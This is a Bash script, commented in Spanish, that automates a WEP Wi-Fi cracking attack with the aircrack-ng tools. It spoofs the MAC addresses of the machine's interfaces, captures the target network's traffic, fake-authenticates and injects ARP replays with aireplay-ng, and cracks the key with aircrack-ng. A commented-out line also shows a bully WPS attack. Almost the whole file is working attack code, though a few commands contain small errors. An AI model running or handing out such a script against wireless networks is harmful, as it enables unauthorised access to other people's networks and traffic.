#!bin/bash
#Script ataque WEP con aircrack-ng un poco cutre ;)
# Variables globales
SCRIPT="airwep"
VERSION="0.1 Public"
BACKTITLE="$SCRIPT $VERSION - 2k15 -"
TMP="/tmp/$SCRIPT"

#DEFINED COLOR SETTINGS
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 4 && tput bold)

echo ""
echo ""
echo $RED"             +########################################+"
echo $RED"             +                                        +"
echo $RED"             +                                        +"
echo $RED"             +             $GREEN airwep Script $RED            +"
echo $RED"             +                                        +"
echo $RED"             +              $GREEN Version 0.1 $RED             +"
echo $RED"             +                                        +"
echo $RED"             +                                        +"
echo $RED"             +########################################+"
echo ""
sleep 1
########################################## detectar root ###########################################################

FUNCROOT(){
W=$(whoami)
if [ "$W" == "root" ]; then
sleep 0.5
echo $RED" Eres root, cuidado con lo que haces pichón..."
sleep 1
else 
echo ""
echo " Necesitas loguearte como root para continuar..." 
echo "" 
exit
fi
}
echo ""
####################################################################################################################
FUNCROOT                           #si se quiere poner en segundo plano : >/dev/null 2>&1
echo $STAND""
#
######################################## Detectar interfaces #######################################################
readarray -t interfaces < <(ip link | grep "<" | cut -d " " -f 2 | cut -d ":" -f 1 | grep -v lo)
#
######################################## Cambiando interfaces ######################################################
for interfaz in "${interfaces[@]}"; do
    echo $BLUE"Interfaz: $interfaz"
    echo $RED"--------------------------------------------------------------------------------"$STAND
    ifconfig $interfaz down 
    ip link set $interfaz down 
    macchanger -e $interfaz 
    sleep 0.5
    ifconfig $interfaz up
    echo $RED"--------------------------------------------------------------------------------"$STAND
done
sleep 1
echo ""
echo $BLUE"Se cambiaron las MAC's de todas las interfaces encontradas"
echo ""
echo $BLUE"Introduce la interfaz que desea poner en modo monitor:"
echo $GREEN"" 
read INT1
echo $BLUE""
echo "Poniendo interfaz en modo monitor..."
echo ""
airmon-ng start $INT1 >/dev/null 2>&1
airmon-ng stop $INT1 >/dev/null 2>&1
sleep 1
readarray -t interfaces < <(ip link | grep "<" | cut -d " " -f 2 | cut -d ":" -f 1 | grep -v lo)
echo $BLUE"Las interfaces son: "
echo $STAND""
for interfaces in "${interfaces[@]}"; do
    echo $RED"$interfaces" 
done
sleep 1
echo $BLUE""
echo "Introduce la interfaz en modo monitor que desea utilizar:"
echo $GREEN"" 
read INT2
#Buscamos redes a traves de airodump
#xterm -T BUSCANDO -e airodump-ng $INT2 +h
gnome-terminal -t BUSCANDO REDES --hide-menubar -x airodump-ng $INT2
sleep 1
#
#Pedimos las MAC, el canal y el nombre de archivo
echo $BLUE"Introduce el BSSID (MAC) de la red con cifrado WEP a atacar: "
echo "Ejemplo: 11:22:33:44:55:66"
echo $GREEN""
read MACatacada
sleep 0.5
echo $BLUE"Introduce el canal (chanel o CH) de la red con cifrado WEP a atacar: "
echo "Ejemplo: 11"
echo $GREEN""
read canal
sleep 0.5
echo $BLUE"Introduce el nombre del archivo donde guardar los datos: "
echo "Ejemplo: nombre"
echo $GREEN""
read name
sleep 0.5
echo $BLUE"Introduce el ESSID (Nombre de la red) da atacar: "
echo "Ejemplo: ONO2357"
echo $GREEN""
read ESSID
sleep 0.5

#capturamos los datas de la red seleccionada
xterm -hold -fg FloralWhite -bg DarkBlue -T "CAPTANDO DATOS" -e \ 
airodump-ng -c $canal -w $name bssid $MACatacada $INT2
sleep 1

ifconfig
sleep 0.5
echo $BLUE"Introduce tu dirección MAC: "
echo "Ejemplo: 11:22:33:44:55:66"
echo $GREEN""
read MIMAC

#Asociandonos a la red
gnome-terminal -T ASOCIACION -x aireplay-ng -1 0 -a $MACatacada -h $MIMAC -e $ESSID $INT2
#Injectando el trafico
gnome-terminal -T "INJECTANDO TRAFICO" -x aireplay-ng -3 -b $MACatacada -h $MIMAC $INT2
#Desencriptando password
gnome-terminal -T DESENCRIPTANDO -x aircrack-ng $name  #poner correcto el nombre del archivo $name-01.pcap

#Ejemplo
#xterm -hold -fg FloralWhite -bg DarkBlue -T "Bully -> $ESSID" -e \
#bully -b $BSSID -c $CANAL $PIN_WPS $NO_CHECKSUM $OPTIONS -N $INTERFACE_MON & BULLY_PID=$!



